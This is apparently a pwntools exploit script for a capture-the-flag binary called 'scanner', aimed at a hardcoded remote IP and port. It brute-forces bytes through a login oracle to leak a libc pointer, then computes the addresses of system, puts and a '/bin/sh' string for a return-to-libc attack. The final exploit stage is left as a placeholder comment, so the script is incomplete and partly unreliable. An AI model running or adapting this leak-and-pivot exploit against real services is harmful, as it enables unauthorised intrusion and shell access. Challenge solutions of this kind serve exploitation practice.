#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import * 

def finder(symbol, address, num=1):
    return address - 0x1ec6a0  

local_mode = 0
elf = './scanner'
e = ELF(elf)
ip_port = ['83.136.252.32', 54251]

def debug():
    if local_mode == 1:
        gdb.attach(p)

def add(mun, text):
    p.sendline('1')
    p.recvuntil('{i} Username length:')
    p.sendline(str(mun))
    p.recvuntil('{i} Enter username:')
    p.sendline(text)

def login(text):
    p.sendline('2')
    p.recvuntil('{i} Username:')
    p.send(text)

def guess(n):
    for i in range(0x100):
        add(0x20+n, 'w'*0x20 + 'w'*(n-1) + chr(i))
        p.recvuntil('->')
        login('w'*(0x20+n-1) + '\n')
        line = p.recvline()[:-1]
        if line != ' Invalid username! :)':
            return i
    return 0xa

def link():
    x, k = 0, 0x100
    for i in range(6):
        x += guess(i+1) * k
        k *= 0x100
    return x // 0x100

while True:
    try:
        p = process(elf) if local_mode == 1 else remote(ip_port[0], ip_port[-1])
        stdout_addr = link()
        libc_base = finder('_IO_2_1_stdout_', stdout_addr, num=1)
        # Example placeholders for libc base calculation and other addresses.
        # Replace with actual calculated addresses.
        system_addr = libc_base + 0x55410
        puts_addr = libc_base + 0x875a0
        sh_addr = libc_base + 0x1b5661
        log.info(f'sh: {hex(sh_addr)}')
        debug()
        # Implement remaining exploit logic here...

    except Exception as e:
        print(f"An error occurred: {e}")
        p.close()
    else:
        p.interactive()
